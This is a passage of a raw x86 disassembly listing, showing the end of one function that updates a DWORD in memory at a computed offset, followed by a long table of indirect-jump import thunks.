  44e8b9:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e8c0:	mov    ecx,DWORD PTR [ebp-0x4]
  44e8c3:	push   ecx
  44e8c4:	mov    edx,DWORD PTR ds:0x452228
  44e8ca:	push   edx
  44e8cb:	call   0x44d440
  44e8d0:	add    esp,0x8
  44e8d3:	and    eax,0xfff
  44e8d8:	add    eax,0xa124
  44e8dd:	mov    DWORD PTR [ebp-0x8],eax
  44e8e0:	mov    eax,DWORD PTR [ebp+0x8]
  44e8e3:	mov    ecx,DWORD PTR [ebp+0xc]
  44e8e6:	add    ecx,DWORD PTR [eax]
  44e8e8:	mov    edx,DWORD PTR [ebp-0x8]
  44e8eb:	mov    eax,DWORD PTR [ecx+edx*1-0xa124]
  44e8f2:	add    eax,DWORD PTR [ebp+0x10]
  44e8f5:	mov    ecx,DWORD PTR [ebp+0x8]
  44e8f8:	mov    edx,DWORD PTR [ebp+0xc]
  44e8fb:	add    edx,DWORD PTR [ecx]
  44e8fd:	mov    ecx,DWORD PTR [ebp-0x8]
  44e900:	mov    DWORD PTR [edx+ecx*1-0xa124],eax
  44e907:	jmp    0x44e80c
  44e90c:	mov    esp,ebp
  44e90e:	pop    ebp
  44e90f:	ret    
  44e910:	jmp    DWORD PTR ds:0x45139c
  44e916:	jmp    DWORD PTR ds:0x4513a0
  44e91c:	jmp    DWORD PTR ds:0x4513a4
  44e922:	jmp    DWORD PTR ds:0x4513a8
  44e928:	jmp    DWORD PTR ds:0x4513ac
  44e92e:	jmp    DWORD PTR ds:0x4513b0
  44e934:	jmp    DWORD PTR ds:0x4513b4
  44e93a:	jmp    DWORD PTR ds:0x4513b8
  44e940:	jmp    DWORD PTR ds:0x4513bc
  44e946:	jmp    DWORD PTR ds:0x4513c0
  44e94c:	jmp    DWORD PTR ds:0x4513c4
  44e952:	jmp    DWORD PTR ds:0x4513c8
  44e958:	jmp    DWORD PTR ds:0x4513cc
  44e95e:	jmp    DWORD PTR ds:0x4513d0
  44e964:	jmp    DWORD PTR ds:0x4513d4
  44e96a:	jmp    DWORD PTR ds:0x4513d8
  44e970:	jmp    DWORD PTR ds:0x4513dc
  44e976:	jmp    DWORD PTR ds:0x4513e0
  44e97c:	jmp    DWORD PTR ds:0x4513e4
  44e982:	jmp    DWORD PTR ds:0x4513e8
  44e988:	jmp    DWORD PTR ds:0x4513ec
  44e98e:	jmp    DWORD PTR ds:0x4513f0
  44e994:	jmp    DWORD PTR ds:0x4513f4
  44e99a:	jmp    DWORD PTR ds:0x4513f8
  44e9a0:	jmp    DWORD PTR ds:0x4513fc
  44e9a6:	jmp    DWORD PTR ds:0x451400
  44e9ac:	jmp    DWORD PTR ds:0x451404
  44e9b2:	jmp    DWORD PTR ds:0x451408
  44e9b8:	jmp    DWORD PTR ds:0x45140c
  44e9be:	jmp    DWORD PTR ds:0x451410
  44e9c4:	jmp    DWORD PTR ds:0x451414
  44e9ca:	jmp    DWORD PTR ds:0x451418
  44e9d0:	jmp    DWORD PTR ds:0x45141c
  44e9d6:	jmp    DWORD PTR ds:0x451420
  44e9dc:	jmp    DWORD PTR ds:0x451424
  44e9e2:	jmp    DWORD PTR ds:0x451428
  44e9e8:	jmp    DWORD PTR ds:0x45142c
  44e9ee:	jmp    DWORD PTR ds:0x451430
  44e9f4:	jmp    DWORD PTR ds:0x451434
  44e9fa:	jmp    DWORD PTR ds:0x451438
  44ea00:	jmp    DWORD PTR ds:0x45143c
  44ea06:	jmp    DWORD PTR ds:0x451440
  44ea0c:	jmp    DWORD PTR ds:0x451444
  44ea12:	jmp    DWORD PTR ds:0x451448
  44ea18:	jmp    DWORD PTR ds:0x45144c
  44ea1e:	jmp    DWORD PTR ds:0x451450
  44ea24:	jmp    DWORD PTR ds:0x451454
  44ea2a:	jmp    DWORD PTR ds:0x451458
  44ea30:	jmp    DWORD PTR ds:0x45145c
  44ea36:	jmp    DWORD PTR ds:0x451460
  44ea3c:	jmp    DWORD PTR ds:0x451464
  44ea42:	jmp    DWORD PTR ds:0x451468
  44ea48:	jmp    DWORD PTR ds:0x45146c
  44ea4e:	jmp    DWORD PTR ds:0x451470
  44ea54:	jmp    DWORD PTR ds:0x451474
  44ea5a:	jmp    DWORD PTR ds:0x451478
  44ea60:	jmp    DWORD PTR ds:0x45147c
  44ea66:	jmp    DWORD PTR ds:0x451480
  44ea6c:	jmp    DWORD PTR ds:0x451484
  44ea72:	jmp    DWORD PTR ds:0x451488
  44ea78:	jmp    DWORD PTR ds:0x45148c
  44ea7e:	jmp    DWORD PTR ds:0x451490
  44ea84:	jmp    DWORD PTR ds:0x451494
  44ea8a:	jmp    DWORD PTR ds:0x451498
  44ea90:	jmp    DWORD PTR ds:0x45149c
  44ea96:	jmp    DWORD PTR ds:0x4514a4
  44ea9c:	jmp    DWORD PTR ds:0x4514a8
  44eaa2:	jmp    DWORD PTR ds:0x4514ac
  44eaa8:	jmp    DWORD PTR ds:0x4514b0
  44eaae:	jmp    DWORD PTR ds:0x4514b4
  44eab4:	jmp    DWORD PTR ds:0x4514b8
  44eaba:	jmp    DWORD PTR ds:0x4514bc
  44eac0:	jmp    DWORD PTR ds:0x4514c0
  44eac6:	jmp    DWORD PTR ds:0x4514c4
  44eacc:	jmp    DWORD PTR ds:0x4514c8
  44ead2:	jmp    DWORD PTR ds:0x4514cc
  44ead8:	jmp    DWORD PTR ds:0x4514d0
  44eade:	jmp    DWORD PTR ds:0x4514d4
  44eae4:	jmp    DWORD PTR ds:0x4514d8
  44eaea:	jmp    DWORD PTR ds:0x4514dc
  44eaf0:	jmp    DWORD PTR ds:0x4514e0
  44eaf6:	jmp    DWORD PTR ds:0x4514e4
  44eafc:	jmp    DWORD PTR ds:0x4514e8
  44eb02:	jmp    DWORD PTR ds:0x4514ec
  44eb08:	jmp    DWORD PTR ds:0x4514f0
  44eb0e:	jmp    DWORD PTR ds:0x4514f4
  44eb14:	jmp    DWORD PTR ds:0x4514f8
  44eb1a:	jmp    DWORD PTR ds:0x4514fc
  44eb20:	jmp    DWORD PTR ds:0x451500
  44eb26:	jmp    DWORD PTR ds:0x451504
  44eb2c:	jmp    DWORD PTR ds:0x451508
  44eb32:	jmp    DWORD PTR ds:0x45150c
  44eb38:	jmp    DWORD PTR ds:0x451510
  44eb3e:	jmp    DWORD PTR ds:0x451514
  44eb44:	jmp    DWORD PTR ds:0x451518
  44eb4a:	jmp    DWORD PTR ds:0x45151c
  44eb50:	jmp    DWORD PTR ds:0x451520
  44eb56:	jmp    DWORD PTR ds:0x451524
  44eb5c:	jmp    DWORD PTR ds:0x451528
  44eb62:	jmp    DWORD PTR ds:0x45152c
  44eb68:	jmp    DWORD PTR ds:0x451530
  44eb6e:	jmp    DWORD PTR ds:0x451534
  44eb74:	jmp    DWORD PTR ds:0x451538
  44eb7a:	jmp    DWORD PTR ds:0x45153c
  44eb80:	jmp    DWORD PTR ds:0x451540
  44eb86:	jmp    DWORD PTR ds:0x451544
  44eb8c:	jmp    DWORD PTR ds:0x451548
  44eb92:	jmp    DWORD PTR ds:0x45154c
  44eb98:	jmp    DWORD PTR ds:0x451550
  44eb9e:	jmp    DWORD PTR ds:0x451554
  44eba4:	jmp    DWORD PTR ds:0x451558
  44ebaa:	jmp    DWORD PTR ds:0x45155c
  44ebb0:	jmp    DWORD PTR ds:0x451560
  44ebb6:	jmp    DWORD PTR ds:0x451564
  44ebbc:	jmp    DWORD PTR ds:0x451568
  44ebc2:	jmp    DWORD PTR ds:0x45156c
  44ebc8:	jmp    DWORD PTR ds:0x451570
  44ebce:	jmp    DWORD PTR ds:0x451574
  44ebd4:	jmp    DWORD PTR ds:0x451578
  44ebda:	jmp    DWORD PTR ds:0x45157c
  44ebe0:	jmp    DWORD PTR ds:0x451580
  44ebe6:	jmp    DWORD PTR ds:0x451584
  44ebec:	jmp    DWORD PTR ds:0x451588
  44ebf2:	jmp    DWORD PTR ds:0x45158c
  44ebf8:	jmp    DWORD PTR ds:0x451590
  44ebfe:	jmp    DWORD PTR ds:0x451594
  44ec04:	jmp    DWORD PTR ds:0x451598
  44ec0a:	jmp    DWORD PTR ds:0x45159c
  44ec10:	jmp    DWORD PTR ds:0x4515a0
  44ec16:	jmp    DWORD PTR ds:0x4515a4
  44ec1c:	jmp    DWORD PTR ds:0x4515a8
  44ec22:	jmp    DWORD PTR ds:0x4515ac
  44ec28:	jmp    DWORD PTR ds:0x4515b0
  44ec2e:	jmp    DWORD PTR ds:0x4515b4
  44ec34:	jmp    DWORD PTR ds:0x4515b8
  44ec3a:	jmp    DWORD PTR ds:0x4515bc
  44ec40:	jmp    DWORD PTR ds:0x4515c0
  44ec46:	jmp    DWORD PTR ds:0x4515c4
  44ec4c:	jmp    DWORD PTR ds:0x4515c8
  44ec52:	jmp    DWORD PTR ds:0x4515cc
  44ec58:	jmp    DWORD PTR ds:0x4515d0
  44ec5e:	jmp    DWORD PTR ds:0x4515d4
  44ec64:	jmp    DWORD PTR ds:0x4515d8
  44ec6a:	jmp    DWORD PTR ds:0x4515e0
  44ec70:	jmp    DWORD PTR ds:0x4515e4
  44ec76:	jmp    DWORD PTR ds:0x4515e8
  44ec7c:	jmp    DWORD PTR ds:0x4515ec
  44ec82:	jmp    DWORD PTR ds:0x4515f0
  44ec88:	jmp    DWORD PTR ds:0x4515f4
  44ec8e:	jmp    DWORD PTR ds:0x4515f8
  44ec94:	jmp    DWORD PTR ds:0x4515fc
  44ec9a:	jmp    DWORD PTR ds:0x451600
  44eca0:	jmp    DWORD PTR ds:0x451604
  44eca6:	jmp    DWORD PTR ds:0x451608
  44ecac:	jmp    DWORD PTR ds:0x45160c
  44ecb2:	jmp    DWORD PTR ds:0x451610
  44ecb8:	jmp    DWORD PTR ds:0x451614
  44ecbe:	jmp    DWORD PTR ds:0x451618
  44ecc4:	jmp    DWORD PTR ds:0x451620
  44ecca:	jmp    DWORD PTR ds:0x451624
  44ecd0:	jmp    DWORD PTR ds:0x45162c
  44ecd6:	jmp    DWORD PTR ds:0x451630
  44ecdc:	jmp    DWORD PTR ds:0x451634
  44ece2:	jmp    DWORD PTR ds:0x451638
  44ece8:	jmp    DWORD PTR ds:0x45163c
  44ecee:	jmp    DWORD PTR ds:0x451640
  44ecf4:	jmp    DWORD PTR ds:0x451644
  44ecfa:	jmp    DWORD PTR ds:0x45164c
  44ed00:	jmp    DWORD PTR ds:0x451654
  44ed06:	jmp    DWORD PTR ds:0x451658
